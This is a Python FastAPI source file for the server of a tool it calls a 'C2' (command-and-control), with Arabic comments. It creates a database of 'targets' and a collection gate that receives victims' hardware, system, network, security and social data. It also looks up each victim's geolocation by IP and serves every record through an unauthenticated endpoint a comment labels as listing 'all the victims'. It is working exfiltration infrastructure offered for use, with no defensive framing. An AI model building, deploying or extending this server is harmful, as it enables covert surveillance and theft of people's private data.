from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, requests

app = FastAPI(title="Luvra Intelligence C2 - Final Edition")

# إعدادات قاعدة البيانات (تأكد من وضعها في Render Environment)
DB_URL = os.environ.get("DATABASE_URL")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def setup_db():
    """إنشاء الجدول المطور إذا لم يكن موجوداً"""
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_v3_intel (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            ip_address TEXT,
            geo_data JSONB,
            hardware_data JSONB,
            system_data JSONB,
            network_data JSONB,
            security_data JSONB,
            social_data JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.client.host
    try:
        payload = await request.json()
        
        # سحب بيانات الموقع الجغرافي عبر الـ IP
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
        
        conn = get_db_conn()
        cur = conn.cursor()
        
        cur.execute("""
            INSERT INTO luvra_v3_intel 
            (target_id, ip_address, geo_data, hardware_data, system_data, network_data, security_data, social_data)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        """, (
            payload.get('target_id'),
            client_ip,
            json.dumps(geo_res),
            json.dumps(payload.get('hardware')),
            json.dumps(payload.get('system')),
            json.dumps(payload.get('network')),
            json.dumps(payload.get('security')),
            json.dumps(payload.get('social_reach'))
        ))
        
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "UPLINK_SUCCESS", "target": client_ip}
    except Exception as e:
        print(f"Critical Error: {e}")
        return {"status": "UPLINK_FAILED"}

@app.get("/api/v1/analytics/full")
async def get_all_data():
    """جلب كل الضحايا لعرضهم في صفحة الـ Analytics"""
    try:
        conn = get_db_conn()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute("SELECT * FROM luvra_v3_intel ORDER BY created_at DESC")
        data = cur.fetchall()
        cur.close()
        conn.close()
        return data
    except Exception as e:
        return {"error": str(e)}

@app.get("/health")
def health_check():
    return {"status": "online", "version": "3.0.0-nuclear"}
